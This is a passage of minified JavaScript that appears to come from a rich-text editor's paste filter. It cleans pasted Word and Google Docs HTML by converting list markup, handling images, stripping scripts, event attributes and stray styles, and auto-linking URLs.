          return !!(ct(e) ? nc(e, ["mso-list"], y(!1)) : [])["mso-list"]
        })
      },
      extractCommentSpan: function (e) {
        return Ni(e, ut)
          .bind(wo)
          .filter(function (e) {
            return "span" === ot(e)
          })
      },
      isSymbol: Hs,
      deduceLevel: function (e) {
        return Ja(e, "margin-left").bind(function (e) {
          var t = parseInt(e, 10)
          return isNaN(t) ? N.none() : N.some(Math.max(1, Math.ceil(t / 18)))
        })
      },
    },
    $s = function (e) {
      for (var t = []; null !== e.nextNode(); )
        t.push(ht.fromDom(e.currentNode))
      return t
    },
    Vs = fo().browser,
    Xs =
      Vs.isIE() || Vs.isEdge()
        ? function (e) {
            try {
              return $s(e)
            } catch (e) {
              return []
            }
          }
        : $s,
    Gs = y(y(!0)),
    Ks = function (e) {
      var t = (function (e, t) {
        var n = t.fold(Gs, function (t) {
          return function (e) {
            return t(e.nodeValue)
          }
        })
        n.acceptNode = n
        var r = g.document.createTreeWalker(
          e.dom(),
          g.NodeFilter.SHOW_COMMENT,
          n,
          !1
        )
        return Xs(r)
      })(e, N.none())
      Y(t, Na)
    },
    zs = function (e, t, n, r) {
      !(function (e, t, n) {
        lt(e, "data-list-level", t)
        var r = JSON.stringify(n)
        lt(e, "data-list-emblems", r)
      })(e, t, n),
        Ks(e),
        Y(r, Na),
        gt(e, "style"),
        gt(e, "class")
    },
    Js = function (e) {
      return ((r = e),
      qs.extractLevel(r).bind(function (n) {
        return qs.extractSymSpan(r).bind(function (t) {
          return qs.extractEmblem(t, !0).map(function (e) {
            return {
              mutate: function () {
                zs(r, n, e, [t])
              },
            }
          })
        })
      }))
        .orThunk(function () {
          return (
            (r = e),
            qs.extractLevel(r).bind(function (n) {
              return qs.extractCommentSpan(r).bind(function (t) {
                return qs.extractEmblem(t, qs.isSymbol(t)).map(function (e) {
                  return {
                    mutate: function () {
                      zs(r, n, e, [t])
                    },
                  }
                })
              })
            })
          )
          var r
        })
        .orThunk(function () {
          return (
            (r = e),
            qs.extractLevel(r).bind(function (n) {
              return qs.extractCommentSpan(r).bind(function (t) {
                return qs.extractEmblem(t, qs.isSymbol(t)).map(function (e) {
                  return {
                    mutate: function () {
                      zs(r, n, e, [t])
                    },
                  }
                })
              })
            })
          )
          var r
        })
        .orThunk(function () {
          return "p" !== ot((r = e))
            ? N.none()
            : qs.extractLevel(r).bind(function (n) {
                return qs.extractMsoIgnore(r).bind(function (t) {
                  return qs.extractEmblem(t, !1).map(function (e) {
                    return {
                      mutate: function () {
                        zs(r, n, e, [To(t).getOr(t)])
                      },
                    }
                  })
                })
              })
          var r
        })
        .orThunk(function () {
          return "p" !== ot((r = e))
            ? N.none()
            : qs.extractMsoIgnore(r).bind(function (e) {
                var n = To(e).getOr(e),
                  t = qs.isSymbol(n)
                return qs.extractEmblem(e, t).bind(function (t) {
                  return qs.deduceLevel(r).map(function (e) {
                    return {
                      mutate: function () {
                        zs(r, e, t, [n])
                      },
                    }
                  })
                })
              })
          var r
        })
      var r
    },
    Zs = {
      filter: Rs,
      preprocess: Lc({
        tags: [
          {
            name: Gu.pattern(/^(p|h\d+)$/, Gu.caseInsensitive),
            mutate: function (e) {
              Js(e).each(function (e) {
                e.mutate()
              })
            },
          },
        ],
      }),
    },
    Qs = function (e) {
      return (t = e), (n = !1), ht.fromDom(t.dom().cloneNode(n))
      var t, n
    },
    ef = function (e) {
      return ut(e)
        ? ((t = "v:shape"),
          (n = e.dom().nodeValue),
          (r = ht.fromTag("div")),
          (o = n.indexOf("]>")),
          (r.dom().innerHTML = n.substr(o + "]>".length)),
          _i(r, function (e) {
            return ot(e) === t
          }))
        : N.none()
      var t, n, r, o
    },
    tf = function (e) {
      return Co(e, ".rtf-data-image")
    },
    nf = {
      local: function (e) {
        if (((a = "img"), ct((i = e)) && ot(i) === a)) {
          var t = mt(e, "src")
          if (null != t && to(t, "file://")) {
            var n = Qs(e),
              r = t.split(/[\/\\]/),
              o = r[r.length - 1]
            return (
              lt(n, "data-image-id", o),
              gt(n, "src"),
              lt(n, "data-image-type", "local"),
              Ti(n, "rtf-data-image"),
              N.some(n)
            )
          }
          return N.none()
        }
        return N.none()
        var i, a
      },
      vshape: function (e) {
        return ef(e).map(function (e) {
          var t = mt(e, "o:spid"),
            n = void 0 === t ? mt(e, "id") : t,
            r = ht.fromTag("img")
          return (
            Ti(r, "rtf-data-image"),
            lt(r, "data-image-id", n.substr("_x0000_".length)),
            lt(r, "data-image-type", "code"),
            Ga(r, {
              width: Ka(e, "width"),
              height: Ka(e, "height"),
            }),
            r
          )
        })
      },
      find: tf,
      exists: function (e) {
        return 0 < tf(e).length
      },
      scour: ef,
    },
    rf = function () {
      return /^(mso-.*|tab-stops|tab-interval|language|text-underline|text-effect|text-line-through|font-color|horiz-align|list-image-[0-9]+|separator-image|table-border-color-(dark|light)|vert-align|vnd\..*)$/
    },
    of = function () {
      return /^(font|em|strong|samp|acronym|cite|code|dfn|kbd|tt|b|i|u|s|sub|sup|ins|del|var|span)$/
    },
    af = function (e, t) {
      return _i(e, t).isSome()
    },
    uf = function (e) {
      return (
        void 0 === e.dom().attributes ||
        null === e.dom().attributes ||
        0 === e.dom().attributes.length ||
        (1 === e.dom().attributes.length &&
          "style" === e.dom().attributes[0].name)
      )
    },
    cf = {
      isNotImage: function (e) {
        return "img" !== ot(e)
      },
      hasContent: function (e) {
        return (
          !uf(e) ||
          ((n = (t = e).dom().attributes),
          (r = null != n && 0 < n.length),
          ("span" !== ot(t) || r) &&
            af(e, function (e) {
              var t = !uf(e),
                n = !j(
                  [
                    "font",
                    "em",
                    "strong",
                    "samp",
                    "acronym",
                    "cite",
                    "code",
                    "dfn",
                    "kbd",
                    "tt",
                    "b",
                    "i",
                    "u",
                    "s",
                    "sub",
                    "sup",
                    "ins",
                    "del",
                    "var",
                    "span",
                  ],
                  ot(e)
                )
              return st(e) || t || n
            }))
        )
        var t, n, r
      },
      isList: function (e) {
        return "ol" === ot(e) || "ul" === ot(e)
      },
      isLocal: function (e) {
        var t = mt(e, "src")
        return /^file:/.test(t)
      },
      hasNoAttributes: uf,
      isEmpty: function (e) {
        return 0 === eu(e).length
      },
    },
    sf = function (e, t) {
      var n = ht.fromTag(e)
      $i(t, n)
      var r = t.dom().attributes
      Y(r, function (e) {
        n.dom().setAttribute(e.name, e.value)
      })
      var o = Io(t)
      return Ji(n, o), Na(t), n
    },
    ff = function (e) {
      return Eo(e).bind(function (e) {
        return st(e) && 0 === vu(e).trim().length
          ? ff(e)
          : "li" === ot(e)
          ? N.some(e)
          : N.none()
      })
    },
    lf = {
      changeTag: sf,
      addBrTag: function (e) {
        0 === eu(e).length && Gi(e, ht.fromTag("br"))
      },
      properlyNest: function (n) {
        To(n).each(function (e) {
          var t = ot(e)
          j(["ol", "ul"], t) &&
            ff(n).fold(
              function () {
                var e = ht.fromTag("li")
                Xa(e, "list-style-type", "none"), Ki(n, e)
              },
              function (e) {
                Gi(e, n)
              }
            )
        })
      },
      fontToSpan: function (e) {
        var o = sf("span", e),
          i = {
            "font-size": {
              1: "8pt",
              2: "10pt",
              3: "12pt",
              4: "14pt",
              5: "18pt",
              6: "24pt",
              7: "36pt",
            },
          }
        ae(
          {
            face: "font-family",
            size: "font-size",
            color: "color",
          },
          function (e, t) {
            if (pt(o, t)) {
              var n = mt(o, t),
                r = void 0 !== i[e] && void 0 !== i[e][n] ? i[e][n] : n
              Xa(o, e, r), gt(o, t)
            }
          }
        )
      },
    },
    df = pu(ut, "comment"),
    mf = function (e) {
      return df.get(e)
    },
    pf = Ic({
      tags: [
        {
          name: Gu.pattern(/^([OVWXP]|U[0-9]+|ST[0-9]+):/i, Gu.caseInsensitive),
        },
      ],
    }),
    gf = Sc({
      attributes: [
        {
          name: Gu.exact("id", Gu.caseInsensitive),
          value: Gu.starts("docs-internal-guid", Gu.caseInsensitive),
        },
      ],
    }),
    vf = [Nc([Zs.filter])],
    hf = Sc({
      attributes: [
        {
          name: Gu.pattern(/^v:/, Gu.caseInsensitive),
        },
        {
          name: Gu.exact("href", Gu.caseInsensitive),
          value: Gu.contains("#_toc", Gu.caseInsensitive),
        },
        {
          name: Gu.exact("href", Gu.caseInsensitive),
          value: Gu.contains("#_mso", Gu.caseInsensitive),
        },
        {
          name: Gu.pattern(/^xmlns(:|$)/, Gu.caseInsensitive),
        },
        {
          name: Gu.exact("type", Gu.caseInsensitive),
          condition: cf.isList,
        },
      ],
    }),
    yf = Sc({
      tags: [
        {
          name: Gu.exact("script", Gu.caseInsensitive),
        },
        {
          name: Gu.exact("link", Gu.caseInsensitive),
        },
        {
          name: Gu.exact("style", Gu.caseInsensitive),
          condition: cf.isEmpty,
        },
      ],
      attributes: [
        {
          name: Gu.starts("on", Gu.caseInsensitive),
        },
        {
          name: Gu.exact('"', Gu.caseInsensitive),
        },
        {
          name: Gu.exact("lang", Gu.caseInsensitive),
        },
        {
          name: Gu.exact("language", Gu.caseInsensitive),
        },
      ],
      styles: [
        {
          name: Gu.all(),
          value: Gu.pattern(/OLE_LINK/i, Gu.caseInsensitive),
        },
      ],
    }),
    bf = Sc({
      tags: [
        {
          name: Gu.exact("meta", Gu.caseInsensitive),
        },
      ],
    }),
    Tf = Sc({
      tags: [
        {
          name: Gu.exact("style", Gu.caseInsensitive),
        },
      ],
    }),
    xf = function (e) {
      var t = ot(e)
      return "td" === t || "tr" === t || "table" === t || "col" === t
    },
    Ef = Sc({
      styles: [
        {
          name: Gu.not(
            Gu.pattern(/^(width|height|list-style-type)$/, Gu.caseInsensitive)
          ),
          condition: function (e) {
            return !Ei(e, "ephox-limbo-transform")
          },
        },
        {
          name: Gu.pattern(/^(width|height)$/, Gu.caseInsensitive),
          condition: function (e) {
            return cf.isNotImage(e) && !xf(e)
          },
        },
      ],
    }),
    wf = Sc({
      styles: [
        {
          name: Gu.exact("height", Gu.caseInsensitive),
          condition: function (e) {
            return "td" === ot(e)
          },
        },
        {
          name: Gu.exact("width", Gu.caseInsensitive),
          condition: function (e) {
            return "tr" === ot(e)
          },
        },
        {
          name: Gu.exact("height", Gu.caseInsensitive),
          condition: function (e) {
            return "col" === ot(e)
          },
        },
      ],
    }),
    Sf = Sc({
      classes: [
        {
          name: Gu.not(Gu.exact("rtf-data-image", Gu.caseInsensitive)),
        },
      ],
    }),
    If = Sc({
      styles: [
        {
          name: Gu.pattern(rf(), Gu.caseInsensitive),
        },
      ],
    }),
    Lf = Sc({
      classes: [
        {
          name: Gu.pattern(/mso/i, Gu.caseInsensitive),
        },
      ],
    }),
    Nf = Ic({
      tags: [
        {
          name: Gu.exact("img", Gu.caseInsensitive),
          condition: cf.isLocal,
        },
      ],
    }),
    _f = Ic({
      tags: [
        {
          name: Gu.exact("a", Gu.caseInsensitive),
          condition: cf.hasNoAttributes,
        },
      ],
    }),
    Cf = Sc({
      attributes: [
        {
          name: Gu.exact("style", Gu.caseInsensitive),
          value: Gu.exact("", Gu.caseInsensitive),
          debug: !0,
        },
      ],
    }),
    Of = Sc({
      attributes: [
        {
          name: Gu.exact("class", Gu.caseInsensitive),
          value: Gu.exact("", Gu.caseInsensitive),
          debug: !0,
        },
      ],
    }),
    Df = Ic({
      tags: [
        {
          name: Gu.pattern(of(), Gu.caseInsensitive),
          condition:
            ((Ss = cf.hasContent),
            function () {
              for (var e = [], t = 0; t < arguments.length; t++)
                e[t] = arguments[t]
              return !Ss.apply(null, e)
            }),
        },
      ],
    }),
    Pf = Ic({
      tags: [
        {
          name: Gu.exact("p", Gu.caseInsensitive),
          condition:
            ((Is = "li"),
            function (e) {
              return To(e).exists(function (e) {
                return ot(e) === Is && 1 === Io(e).length
              })
            }),
        },
      ],
    }),
    Af = Lc({
      tags: [
        {
          name: Gu.exact("p", Gu.caseInsensitive),
          mutate: lf.addBrTag,
        },
      ],
    }),
    kf = function (e) {
      var t = lf.changeTag("span", e)
      Ti(t, "ephox-limbo-transform"), Xa(t, "text-decoration", "underline")
    },
    Mf = Lc({
      tags: [
        {
          name: Gu.pattern(/ol|ul/, Gu.caseInsensitive),
          mutate: lf.properlyNest,
        },
      ],
    }),
    Rf = Sc({
      classes: [
        {
          name: Gu.exact("ephox-limbo-transform", Gu.caseInsensitive),
        },
      ],
    }),
    Ff = Sc({
      tags: [
        {
          name: Gu.exact("br", Gu.caseInsensitive),
          condition: Ii("Apple-interchange-newline"),
        },
      ],
    }),
    jf = {
      unwrapWordTags: pf,
      removeWordAttributes: hf,
      removeGoogleDocsId: gf,
      parseLists: vf,
      removeExcess: yf,
      removeMetaTags: bf,
      removeStyleTags: Tf,
      cleanStyles: Ef,
      cleanTables: wf,
      cleanInlineStyleElements: function (e) {
        void 0 === e && (e = [])
        var t = B(e, function (e) {
          return {
            name: Gu.exact(e, Gu.caseInsensitive),
          }
        })
        return Ic({
          tags: t,
        })
      },
      cleanClasses: Sf,
      cleanupBrowserCruft: Sc({
        styles: [
          {
            name: Gu.pattern(/^-/, Gu.caseInsensitive),
          },
          {
            name: Gu.all(),
            value: Gu.exact("initial", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("background-color", Gu.caseInsensitive),
            value: Gu.exact("transparent", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("font-style", Gu.caseInsensitive),
            value: Gu.exact("normal", Gu.caseInsensitive),
          },
          {
            name: Gu.pattern(/font-variant.*/, Gu.caseInsensitive),
          },
          {
            name: Gu.exact("letter-spacing", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("font-weight", Gu.caseInsensitive),
            value: Gu.pattern(/400|normal/, Gu.caseInsensitive),
          },
          {
            name: Gu.exact("orphans", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("text-decoration", Gu.caseInsensitive),
            value: Gu.exact("none", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("text-size-adjust", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("text-indent", Gu.caseInsensitive),
            value: Gu.exact("0px", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("text-transform", Gu.caseInsensitive),
            value: Gu.exact("none", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("white-space", Gu.caseInsensitive),
            value: Gu.exact("normal", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("widows", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("word-spacing", Gu.caseInsensitive),
            value: Gu.exact("0px", Gu.caseInsensitive),
          },
          {
            name: Gu.exact("text-align", Gu.caseInsensitive),
            value: Gu.pattern(/start|end/, Gu.caseInsensitive),
          },
          {
            name: Gu.exact("font-weight", Gu.caseInsensitive),
            value: Gu.pattern(/700|bold/, Gu.caseInsensitive),
            condition: function (e) {
              return /^h\d$/.test(ot(e))
            },
          },
        ],
      }),
      cleanupBrowserTags: Ff,
      unwrapConvertedSpace:
        ((Ns = (Ls = function (e, n) {
          return function (t) {
            return e(t)
              .filter(function (e) {
                return st(t) && n(Ys(e), " ")
              })
              .isSome()
          }
        })(Eo, no)),
        (_s = Ls(wo, to)),
        Lc({
          tags: [
            {
              name: Gu.exact("span", Gu.caseInsensitive),
              condition: Ii("Apple-converted-space"),
              mutate: function (e) {
                "\xa0" === Ys(e) &&
                  (Ns(e) || _s(e) ? _a(e) : ($i(e, ht.fromText(" ")), Na(e)))
              },
            },
          ],
        })),
      mergeStyles: If,
      mergeClasses: Lf,
      removeLocalImages: Nf,
      removeVacantLinks: _f,
      removeEmptyStyle: Cf,
      removeEmptyClass: Of,
      pruneInlineTags: Df,
      unwrapSingleParagraphsInlists: Pf,
      addPlaceholders: Af,
      nestedListFixes: Mf,
      inlineTagFixes: function (t) {
        void 0 === t && (t = [])
        var e = [
            {
              name: "b",
              transform: {
                mutate: b(lf.changeTag, "strong"),
              },
            },
            {
              name: "i",
              transform: {
                mutate: b(lf.changeTag, "em"),
              },
            },
            {
              name: "u",
              transform: {
                mutate: kf,
              },
            },
            {
              name: "s",
              transform: {
                mutate: b(lf.changeTag, "strike"),
              },
            },
            {
              name: "font",
              transform: {
                mutate: lf.fontToSpan,
                debug: !0,
              },
            },
          ],
          n = H(e, function (e) {
            return !j(t, e.name)
          }).map(function (e) {
            return oe(
              {
                name: Gu.exact(e.name, Gu.caseInsensitive),
              },
              e.transform
            )
          })
        return Lc({
          tags: n,
        })
      },
      cleanupFlags: Rf,
      distillAnchorsFromLocalLinks:
        ((Cs = /^file:\/\/\/[^#]+(#[^#]+)$/),
        Lc({
          tags: [
            {
              name: Gu.exact("a", Gu.caseInsensitive),
              condition: function (e) {
                var t = mt(e, "href")
                return !!t && Cs.test(t)
              },
              mutate: function (e) {
                var t = mt(e, "href")
                lt(e, "href", t.replace(Cs, "$1"))
              },
            },
          ],
        })),
      removeLocalLinks: Sc({
        attributes: [
          {
            name: Gu.exact("href", Gu.caseInsensitive),
            value: Gu.starts("file:///", Gu.caseInsensitive),
            debug: !0,
          },
        ],
      }),
      replaceClipboardChangedUrls: Lc({
        tags: [
          (Os = function (e, n, r) {
            return {
              name: Gu.exact(e, Gu.caseInsensitive),
              condition: function (e) {
                return pt(e, n)
              },
              mutate: function (e) {
                var t = mt(e, n)
                lt(e, r, t), gt(e, n)
              },
            }
          })("a", "data-ephox-href", "href"),
          Os("img", "data-ephox-src", "src"),
        ],
      }),
      removeFragmentComments: function (a) {
        var u = [
            "table",
            "thead",
            "tbody",
            "tfoot",
            "th",
            "tr",
            "td",
            "ul",
            "ol",
            "li",
          ],
          e = _o(a, ut),
          t = $(e, function (e) {
            return eo(mf(e), "StartFragment")
          }),
          n = $(e, function (e) {
            return eo(mf(e), "EndFragment")
          })
        t.each(function (i) {
          n.each(function (e) {
            for (
              var t,
                n = i,
                r = [],
                o =
                  ((t = wu(i, 0, e, 0)), ht.fromDom(t.commonAncestorContainer));
              void 0 !== o && !ho(o, a);

            )
              j(u, ot(o)) ? (n = o) : r.push(o), (o = To(o).getOr(void 0))
            Y(r, _a), Y(So(n), Na)
          }),
            Na(i)
        }),
          n.each(Na)
      },
      removeTableStyleAttrs: Sc({
        attributes: [
          {
            name: Gu.pattern(/^(width|height)$/, Gu.caseInsensitive),
            condition: xf,
          },
        ],
      }),
      transformParagraphAlign: Lc({
        tags: [
          {
            name: Gu.exact("p", Gu.caseInsensitive),
            mutate: function (t) {
              var e, n
              ;((e = t), (n = "align"), N.from(mt(e, n))).each(function (e) {
                gt(t, "align"),
                  Ja(t, "text-align").fold(function () {
                    return Xa(t, "text-align", e)
                  }, L)
              })
            },
          },
        ],
      }),
      none: L,
    },
    Uf = function (e) {
      return e.browser.isIE() && 11 <= e.browser.version.major
    },
    Bf = function (i, a) {
      return Oc(function (e, t) {
        var r,
          o,
          n =
            ((r = t),
            (o = a),
            i(ht.fromDom(r.getNode())).fold(
              function () {
                return [r]
              },
              function (e) {
                var t = r.type() === bc.END_ELEMENT_TYPE,
                  n = [bc.token(e.dom(), t)]
                return !t && o && n.push(bc.token(e.dom(), !0)), n
              }
            ))
        Y(n, e.emit)
      }, L)
    },
    Yf = function (e, t, n, r) {
      var o,
        i,
        a,
        u,
        c,
        s,
        f,
        l,
        d,
        m,
        p,
        g,
        v,
        h,
        y,
        b,
        T,
        x =
          ((o = e),
          (a = (i = n).browser.isFirefox() || i.browser.isEdge()),
          (u = a ? nf.local : nf.vshape),
          (c = !a),
          (s = Uf(i) ? jf.none : Nc([Bf(u, c)])),
          {
            annotate: [o ? s : jf.none],
            local: [a ? jf.none : jf.removeLocalImages],
          })
      return X([
        x.local,
        ((b = e), (T = n), Uf(T) || !b ? [] : [Zs.preprocess]),
        x.annotate,
        [jf.inlineTagFixes(t ? [] : r.cleanFilteredInlineElements)],
        (function (e, t, n) {
          if (!e) return [jf.none]
          var r = [jf.unwrapWordTags],
            o = Uf(n) ? [] : jf.parseLists
          return r.concat(o).concat([jf.removeWordAttributes])
        })(e, 0, n),
        [jf.removeGoogleDocsId],
        [jf.nestedListFixes],
        [jf.removeExcess],
        [jf.removeMetaTags],
        ((g = t),
        (v = r),
        (h = [jf.transformParagraphAlign, jf.mergeStyles, jf.mergeClasses]),
        (y = [
          jf.transformParagraphAlign,
          jf.cleanStyles,
          jf.cleanInlineStyleElements(v.cleanFilteredInlineElements),
          jf.cleanClasses,
        ]),
        g ? h : y),
        [
          jf.distillAnchorsFromLocalLinks,
          jf.removeLocalLinks,
          jf.removeVacantLinks,
          jf.replaceClipboardChangedUrls,
        ],
        [jf.removeEmptyStyle],
        [jf.removeEmptyClass],
        [jf.pruneInlineTags],
        [jf.cleanupBrowserTags],
        ((m = e), (p = t), !m && p ? [jf.cleanupBrowserCruft] : []),
        [jf.unwrapConvertedSpace],
        [jf.addPlaceholders],
        ((l = e),
        (d = n),
        Uf(d) && l ? [jf.unwrapSingleParagraphsInlists] : []),
        ((f = e), f ? [jf.cleanTables, jf.removeTableStyleAttrs] : []),
        [jf.cleanupFlags],
        [jf.removeStyleTags],
      ])
    },
    Wf = [
      "body",
      "p",
      "div",
      "article",
      "aside",
      "figcaption",
      "figure",
      "footer",
      "header",
      "nav",
      "section",
      "ol",
      "ul",
      "li",
      "table",
      "thead",
      "tbody",
      "tfoot",
      "caption",
      "tr",
      "td",
      "th",
      "h1",
      "h2",
      "h3",
      "h4",
      "h5",
      "h6",
      "blockquote",
      "pre",
      "address",
    ]
  var Hf = function (e) {
      return (
        (t = e),
        (n = y(0)),
        (r = y(0)),
        (o = N.none()),
        {
          term: function () {
            return new RegExp(t, o.getOr("g"))
          },
          prefix: n,
          suffix: r,
        }
      )
      var t, n, r, o
    },
    qf = function (e, t) {
      return V(e, function (e) {
        return e.start() === t
      })
    },
    $f = function (e, t, n) {
      var r,
        o,
        i = n(e, t)
      return (
        (r = i),
        (o = e.start()),
        B(r, function (e) {
          return oe(oe({}, e), {
            start: y(e.start() + o),
            finish: y(e.finish() + o),
          })
        })
      )
    },
    Vf = function (e, n, t) {
      return (
        void 0 === t && (t = 0),
        q(
          e,
          function (t, e) {
            return n(e, t.len).fold(y(t), function (e) {
              return {
                len: e.finish(),
                list: t.list.concat([e]),
              }
            })
          },
          {
            len: t,
            list: [],
          }
        ).list
      )
    },
    Xf = function (e, t, n) {
      return 0 === t.length
        ? e
        : G(e, function (r) {
            var e = G(t, function (e) {
              return (n = e) >= (t = r).start() && n <= t.finish()
                ? [e - r.start()]
                : []
              var t, n
            })
            return 0 < e.length ? $f(r, e, n) : [r]
          })
    },
    Gf = function (o, e, i) {
      var t = qf(o, e),
        a = qf(o, i)
      return t
        .bind(function (e) {
          var t,
            n,
            r = a.getOr(
              ((n = i),
              (t = o)[t.length - 1] && t[t.length - 1].finish() === n
                ? t.length + 1
                : -1)
            )
          return -1 < r ? N.some(o.slice(e, r)) : N.none()
        })
        .getOr([])
    },
    Kf = function (n, e) {
      var t,
        r,
        o = G(e, function (t) {
          var e = (function (e, t) {
            for (var n = t.term(), r = [], o = n.exec(e); o; ) {
              var i = o.index + t.prefix(o),
                a = o[0].length - t.prefix(o) - t.suffix(o)
              r.push({
                start: y(i),
                finish: y(i + a),
              }),
                (n.lastIndex = i + a),
                (o = n.exec(e))
            }
            return r
          })(n, t.pattern())
          return B(e, function (e) {
            return oe(oe({}, t), e)
          })
        })
      return (
        (t = o),
        (r = Array.prototype.slice.call(t, 0)).sort(function (e, t) {
          return e.start() < t.start() ? -1 : t.start() < e.start() ? 1 : 0
        }),
        r
      )
    },
    zf =
      (sr("word", "pattern"),
      sr("element", "offset"),
      sr("element", "deltaOffset"),
      sr("element", "start", "finish")),
    Jf =
      (sr("begin", "end"),
      sr("element", "text"),
      de([
        {
          include: ["item"],
        },
        {
          excludeWith: ["item"],
        },
        {
          excludeWithout: ["item"],
        },
      ])),
    Zf = {
      include: Jf.include,
      excludeWith: Jf.excludeWith,
      excludeWithout: Jf.excludeWithout,
      cata: function (e, t, n, r) {
        return e.fold(t, n, r)
      },
    },
    Qf = function (e, n) {
      var r = [],
        o = []
      return (
        Y(e, function (e) {
          var t = n(e)
          Zf.cata(
            t,
            function () {
              o.push(e)
            },
            function () {
              0 < o.length && r.push(o), r.push([e]), (o = [])
            },
            function () {
              0 < o.length && r.push(o), (o = [])
            }
          )
        }),
        0 < o.length && r.push(o),
        r
      )
    },
    el = de([
      {
        boundary: ["item", "universe"],
      },
      {
        empty: ["item", "universe"],
      },
      {
        text: ["item", "universe"],
      },
    ]),
    tl = x,
    nl = E,
    rl = y(0),
    ol = y(1),
    il = function (e) {
      return oe(oe({}, e), {
        isBoundary: function () {
          return e.fold(nl, tl, tl)
        },
        toText: function () {
          return e.fold(N.none, N.none, function (e) {
            return N.some(e)
          })
        },
        is: function (n) {
          return e.fold(tl, tl, function (e, t) {
            return t.eq(e, n)
          })
        },
        len: function () {
          return e.fold(rl, ol, function (e, t) {
            return t.property().getText(e).length
          })
        },
      })
    },
    al = {
      text: d(il, el.text),
      boundary: d(il, el.boundary),
      empty: d(il, el.empty),
      cata: function (e, t, n, r) {
        return e.fold(t, n, r)
      },
    },
    ul = function (t, e, n) {
      if (t.property().isText(e)) return [al.text(e, t)]
      if (t.property().isEmptyTag(e)) return [al.empty(e, t)]
      if (t.property().isElement(e)) {
        var r = t.property().children(e),
          o = t.property().isBoundary(e) ? [al.boundary(e, t)] : [],
          i =
            void 0 !== n && n(e)
              ? []
              : G(r, function (e) {
                  return ul(t, e, n)
                })
        return o.concat(i).concat(o)
      }
      return []
    },
    cl = ul,
    sl = function (t, e, n) {
      var r = G(e, function (e) {
          return cl(t, e, n)
        }),
        o = Qf(r, function (e) {
          return e.match({
            boundary: function () {
              return Zf.excludeWithout(e)
            },
            empty: function () {
              return Zf.excludeWith(e)
            },
            text: function () {
              return Zf.include(e)
            },
          })
        })
      return H(o, function (e) {
        return 0 < e.length
      })
    },
    fl = function (r, e) {
      if (0 === e.length) return [r]
      var t = q(
          e,
          function (e, t) {
            if (0 === t) return e
            var n = r.substring(e.prev, t)
            return {
              prev: t,
              values: e.values.concat([n]),
            }
          },
          {
            prev: 0,
            values: [],
          }
        ),
        n = e[e.length - 1]
      return n < r.length ? t.values.concat(r.substring(n)) : t.values
    },
    ll = function (o, e, t) {
      var n = G(t, function (e) {
          return [e.start(), e.finish()]
        }),
        i = Xf(e, n, function (e, t) {
          return (function (o, e, t) {
            var n = o.property().getText(e),
              r = H(fl(n, t), function (e) {
                return 0 < e.length
              })
            if (r.length <= 1) return [zf(e, 0, n.length)]
            o.property().setText(e, r[0])
            var i = Vf(
                r.slice(1),
                function (e, t) {
                  var n = o.create().text(e),
                    r = zf(n, t, t + e.length)
                  return N.some(r)
                },
                r[0].length
              ),
              a = B(i, function (e) {
                return e.element()
              })
            return o.insert().afterAll(e, a), [zf(e, 0, r[0].length)].concat(i)
          })(o, e.element(), t)
        })
      return B(t, function (e) {
        var t = Gf(i, e.start(), e.finish()),
          n = B(t, function (e) {
            return e.element()
          }),
          r = B(n, o.property().getText).join("")
        return {
          elements: function () {
            return n
          },
          word: e.word,
          exact: function () {
            return r
          },
        }
      })
    },
    dl = function (a, e, u, t) {
      var n = sl(a, e, t)
      return G(n, function (e) {
        var r,
          t = G(e, function (e) {
            return e.fold(y([]), y([]), function (e) {
              return [e]
            })
          }),
          n = B(t, a.property().getText).join(""),
          o = Kf(n, u),
          i =
            ((r = a),
            Vf(t, function (e, t) {
              var n = t + r.property().getText(e).length
              return N.from(zf(e, t, n))
            }))
        return ll(a, i, o)
      })
    },
    ml = {
      up: y({
        selector: Ci,
        closest: Di,
        predicate: Li,
        all: xo,
      }),
      down: y({
        selector: Co,
        predicate: _o,
      }),
      styles: y({
        get: Ka,
        getRaw: Ja,
        set: Xa,
        remove: Za,
      }),
      attrs: y({
        get: mt,
        set: lt,
        remove: gt,
        copyTo: function (e, t) {
          var n = q(
            e.dom().attributes,
            function (e, t) {
              return (e[t.name] = t.value), e
            },
            {}
          )
          dt(t, n)
        },
      }),
      insert: y({
        before: $i,
        after: Vi,
        afterAll: zi,
        append: Gi,
        appendAll: Ji,
        prepend: Xi,
        wrap: Ki,
      }),
      remove: y({
        unwrap: _a,
        remove: Na,
      }),
      create: y({
        nu: ht.fromTag,
        clone: function (e) {
          return ht.fromDom(e.dom().cloneNode(!1))
        },
        text: ht.fromText,
      }),
      query: y({
        comparePosition: function (e, t) {
          return e.dom().compareDocumentPosition(t.dom())
        },
        prevSibling: Eo,
        nextSibling: wo,
      }),
      property: y({
        children: Io,
        name: ot,
        parent: To,
        document: function (e) {
          return e.dom().ownerDocument
        },
        isText: st,
        isComment: ut,
        isElement: ct,
        getText: vu,
        setText: hu,
        isBoundary: function (e) {
          return !!ct(e) && ("body" === ot(e) || j(Wf, ot(e)))
        },
        isEmptyTag: function (e) {
          return !!ct(e) && j(["br", "img", "hr", "input"], ot(e))
        },
      }),
      eq: ho,
      is: yo,
    },
    pl =
      /(?:(?:[A-Za-z]{3,9}:(?:\/\/))(?:[-.~*+=!&;:'%@?^${}(),\w]+@)?[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*|(?:www\.|[-;:&=+$,.\w]+@)[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*)(?::[0-9]+)?(?:\/[-+~=%.()\/\w]*)?(?:\?(?:[-.~*+=!&;:'%@?^${}(),\/\w]+))?(?:#(?:[-.~*+=!&;:'%@?^${}(),\/\w]+))?/g
        .source,
    gl = function (e) {
      var t,
        n = sr("word", "pattern")("__INTERNAL__", Hf(pl))
      return dl(ml, e, [n], t)
    },
    vl = function (e) {
      return !Di(e, "a", t).isSome()
      var t
    },
    hl = function (e) {
      var t = e.indexOf("://")
      return 3 <= t && t <= 9
    },
    yl = {
      links: function (e) {
        var t = gl(e)
        Y(t, function (e) {
          var n,
            t = e.exact()
          ;(t.indexOf("@") < 0 || hl(t)) &&
            ((n = e.elements()),
            N.from(n[0])
